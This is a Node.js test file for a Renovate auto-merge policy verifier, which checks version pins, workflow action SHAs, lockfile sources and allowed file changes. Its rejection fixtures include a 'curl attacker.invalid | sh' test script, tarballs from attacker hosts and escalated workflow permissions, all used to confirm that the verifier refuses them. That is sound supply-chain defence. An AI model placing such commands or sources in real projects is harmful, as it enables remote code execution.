#!/usr/bin/env node

import assert from "node:assert/strict";
import {
  compareSemver,
  parseNameStatus,
  verifyChecks,
  verifyLockfileSources,
  verifyPackageUpdate,
  verifyRenovateChange,
  verifyWorkflowUpdate,
} from "./verify-renovate-pr.mjs";

const BASE_SHA = "a".repeat(40);
const HEAD_SHA = "b".repeat(40);
const basePackage = {
  name: "bookworm",
  private: true,
  type: "module",
  scripts: { test: "node scripts/test-renovate-policy.mjs" },
  devDependencies: { fflate: "0.8.3", wasmtts: "github:enstw/wasmtts#v1.0.0" },
};
const headPackage = {
  ...basePackage,
  devDependencies: { fflate: "0.8.4", wasmtts: "github:enstw/wasmtts#v1.1.0" },
};
const oldWorkflow = `jobs:\n  test:\n    steps:\n      - uses: actions/checkout@${"1".repeat(40)} # v6.0.0\n      - run: pnpm test\n`;
const newWorkflow = `jobs:\n  test:\n    steps:\n      - uses: actions/checkout@${"2".repeat(40)} # v7.0.0\n      - run: pnpm test\n`;
const oldToolWorkflow = `jobs:\n  test:\n    steps:\n      - uses: pnpm/action-setup@${"1".repeat(40)} # v6.0.8\n        with:\n          version: 11.20.0\n      - uses: actions/setup-node@${"3".repeat(40)} # v6.3.0\n        with:\n          node-version: 24.18.0\n`;
const newToolWorkflow = `jobs:\n  test:\n    steps:\n      - uses: pnpm/action-setup@${"2".repeat(40)} # v6.0.9\n        with:\n          version: 11.21.0\n      - uses: actions/setup-node@${"4".repeat(40)} # v6.4.0\n        with:\n          node-version: 24.19.0\n`;

function mustRefuse(fn, pattern) {
  assert.throws(fn, pattern);
}

assert.equal(verifyPackageUpdate(JSON.stringify(basePackage), JSON.stringify(headPackage)), 2);
assert(compareSemver("2.0.0", "1.99.99") > 0);
assert(compareSemver("1.0.0", "1.0.0-rc.1") > 0);
assert(compareSemver("1.0.0-rc.10", "1.0.0-rc.2") > 0);
mustRefuse(
  () => verifyPackageUpdate(
    JSON.stringify(basePackage),
    JSON.stringify({ ...headPackage, scripts: { test: "curl attacker.invalid | sh" } }),
  ),
  /outside dependency fields/,
);
mustRefuse(
  () => verifyPackageUpdate(
    JSON.stringify(basePackage),
    JSON.stringify({ ...basePackage, devDependencies: { ...basePackage.devDependencies, injected: "1.0.0" } }),
  ),
  /changed the key set/,
);
mustRefuse(
  () => verifyPackageUpdate(
    JSON.stringify(basePackage),
    JSON.stringify({ ...basePackage, devDependencies: { ...basePackage.devDependencies, fflate: "^0.9.0" } }),
  ),
  /not pinned/,
);
mustRefuse(
  () => verifyPackageUpdate(
    JSON.stringify(basePackage),
    JSON.stringify({ ...basePackage, devDependencies: { ...basePackage.devDependencies, fflate: "0.8.2" } }),
  ),
  /not an upgrade/,
);

assert.deepEqual(
  verifyWorkflowUpdate(".github/workflows/test.yml", oldWorkflow, newWorkflow),
  { actionPins: 1, toolPins: 0, actionUpdates: [{ action: "actions/checkout", sha: "2".repeat(40), version: "7.0.0" }] },
);
mustRefuse(
  () => verifyWorkflowUpdate(".github/workflows/test.yml", oldWorkflow, newWorkflow.replace("pnpm test", "pnpm publish")),
  /outside an allowed automation pin/,
);
mustRefuse(
  () => verifyWorkflowUpdate(".github/workflows/test.yml", oldWorkflow, newWorkflow.replace("actions/checkout", "attacker/checkout")),
  /changed the action identity/,
);
mustRefuse(
  () => verifyWorkflowUpdate(".github/workflows/test.yml", newWorkflow, oldWorkflow),
  /not an exact version upgrade/,
);
assert.deepEqual(
  verifyWorkflowUpdate(".github/workflows/test.yml", oldToolWorkflow, newToolWorkflow),
  {
    actionPins: 2,
    toolPins: 2,
    actionUpdates: [
      { action: "pnpm/action-setup", sha: "2".repeat(40), version: "6.0.9" },
      { action: "actions/setup-node", sha: "4".repeat(40), version: "6.4.0" },
    ],
  },
);
// A trigger change is never an automation pin, even when a legitimate pin
// bump rides in the same file.
mustRefuse(
  () => verifyWorkflowUpdate(
    ".github/workflows/test.yml",
    `on: [push]\n${oldWorkflow}`,
    `on: [pull_request_target]\n${newWorkflow}`,
  ),
  /outside an allowed automation pin/,
);
mustRefuse(
  () => verifyWorkflowUpdate(
    ".github/workflows/test.yml",
    `permissions:\n  contents: read\n${oldWorkflow}`,
    `permissions:\n  contents: write\n${newWorkflow}`,
  ),
  /outside an allowed automation pin/,
);
mustRefuse(
  () => verifyWorkflowUpdate(
    ".github/workflows/test.yml",
    "steps:\n  - run: echo safe\n    version: 1.0.0\n",
    "steps:\n  - run: echo safe\n    version: 2.0.0\n",
  ),
  /not owned by pnpm\/action-setup/,
);
const oldRenovate = '      - run: pnpm dlx "renovate@44.24.1" --platform=github enstw/bookworm\n';
const newRenovate = '      - run: pnpm dlx "renovate@44.25.0" --platform=github enstw/bookworm\n';
assert.deepEqual(
  verifyWorkflowUpdate(".github/workflows/renovate.yml", oldRenovate, newRenovate),
  { actionPins: 0, toolPins: 1, actionUpdates: [] },
);
mustRefuse(
  () => verifyWorkflowUpdate(".github/workflows/renovate.yml", newRenovate, oldRenovate),
  /Renovate is not an exact version upgrade/,
);

assert.deepEqual(
  parseNameStatus(`M\0package.json\0M\0pnpm-lock.yaml\0`),
  [{ status: "M", path: "package.json" }, { status: "M", path: "pnpm-lock.yaml" }],
);
assert.deepEqual(
  parseNameStatus(`R100\0old.yml\0new.yml\0`),
  [{ status: "R100", path: "old.yml", destination: "new.yml" }],
);
assert.equal(verifyChecks([]), 0);
assert.equal(verifyChecks([{ __typename: "StatusContext", context: "renovate/stability-days", state: "SUCCESS" }]), 1);
mustRefuse(
  () => verifyChecks([{ __typename: "CheckRun", name: "candidate-gate", status: "COMPLETED", conclusion: "FAILURE" }]),
  /candidate-gate is COMPLETED\/FAILURE/,
);

const metadata = {
  number: 42,
  state: "open",
  draft: false,
  changed_files: 3,
  base: { ref: "main", sha: BASE_SHA, repo: { full_name: "enstw/bookworm" } },
  head: { ref: "renovate/weekly-roll-up", sha: HEAD_SHA, repo: { full_name: "enstw/bookworm" } },
};
const goodLockfile = "lockfileVersion: '9.0'\npackages:\n  wasmtts@https://codeload.github.com/enstw/wasmtts/tar.gz/f4d4:\n    resolution: {gitHosted: true, tarball: https://codeload.github.com/enstw/wasmtts/tar.gz/f4d4}\n";
const files = new Map([
  [`${BASE_SHA}:package.json`, JSON.stringify(basePackage)],
  [`${HEAD_SHA}:package.json`, JSON.stringify(headPackage)],
  [`${HEAD_SHA}:pnpm-lock.yaml`, goodLockfile],
  [`${BASE_SHA}:.github/workflows/test.yml`, oldWorkflow],
  [`${HEAD_SHA}:.github/workflows/test.yml`, newWorkflow],
]);
const resolveCheckoutTag = (action, version) =>
  action === "actions/checkout" && version === "7.0.0" ? "2".repeat(40) : "0".repeat(40);
const goodInput = {
  metadata,
  statusCheckRollup: [],
  entries: [
    { status: "M", path: "package.json" },
    { status: "M", path: "pnpm-lock.yaml" },
    { status: "M", path: ".github/workflows/test.yml" },
  ],
  baseSha: BASE_SHA,
  headSha: HEAD_SHA,
  readGitFile: (sha, path) => files.get(`${sha}:${path}`),
  resolveActionTag: resolveCheckoutTag,
};
const result = verifyRenovateChange(goodInput);
assert.deepEqual(result, { changedFiles: 3, dependencyPins: 2, actionPins: 1, toolPins: 0, checkCount: 0 });

assert.equal(verifyLockfileSources(goodLockfile), 2);
mustRefuse(
  () => verifyLockfileSources("resolution: {tarball: https://attacker.invalid/fflate.tgz}\n"),
  /unexpected source/,
);
mustRefuse(
  () => verifyLockfileSources("tarball: http://codeload.github.com/enstw/wasmtts/tar.gz/f4d4\n"),
  /unexpected source/,
);
mustRefuse(
  () => verifyRenovateChange({
    ...goodInput,
    readGitFile: (sha, path) => (path === "pnpm-lock.yaml"
      ? "tarball: https://codeload.github.com/attacker/wasmtts/tar.gz/f4d4\n"
      : files.get(`${sha}:${path}`)),
  }),
  /unexpected source/,
);
mustRefuse(
  () => verifyRenovateChange({ ...goodInput, resolveActionTag: () => "f".repeat(40) }),
  /does not match upstream tag/,
);
mustRefuse(
  () => verifyRenovateChange({ ...goodInput, resolveActionTag: undefined }),
  /no tag resolver/,
);
mustRefuse(
  () => verifyRenovateChange({
    ...goodInput,
    metadata: { ...metadata, head: { ...metadata.head, sha: "c".repeat(40) } },
  }),
  /API metadata does not match the fetched commit pair/,
);

mustRefuse(
  () => verifyRenovateChange({
    metadata: { ...metadata, changed_files: 1 },
    statusCheckRollup: [],
    entries: [{ status: "M", path: ".github/renovate.json5" }],
    baseSha: BASE_SHA,
    headSha: HEAD_SHA,
    readGitFile: () => "",
  }),
  /outside the dependency-update allowlist/,
);
mustRefuse(
  () => verifyRenovateChange({
    metadata: { ...metadata, changed_files: 1 },
    statusCheckRollup: [],
    entries: [{ status: "A", path: ".github/workflows/injected.yml" }],
    baseSha: BASE_SHA,
    headSha: HEAD_SHA,
    readGitFile: () => "",
  }),
  /disallowed change type/,
);
mustRefuse(
  () => verifyRenovateChange({
    metadata: { ...metadata, changed_files: 1 },
    statusCheckRollup: [],
    entries: [{ status: "M", path: "pnpm-lock.yaml" }],
    baseSha: BASE_SHA,
    headSha: HEAD_SHA,
    readGitFile: () => "",
  }),
  /must change together/,
);
mustRefuse(
  () => verifyRenovateChange({
    metadata: {
      ...metadata,
      changed_files: 3,
      head: { ...metadata.head, repo: { full_name: "attacker/bookworm" } },
    },
    statusCheckRollup: [],
    entries: [
      { status: "M", path: "package.json" },
      { status: "M", path: "pnpm-lock.yaml" },
      { status: "M", path: ".github/workflows/test.yml" },
    ],
    baseSha: BASE_SHA,
    headSha: HEAD_SHA,
    readGitFile: (sha, path) => files.get(`${sha}:${path}`),
  }),
  /head repository or branch is unexpected/,
);

console.log("✓ Renovate auto-merge policy");
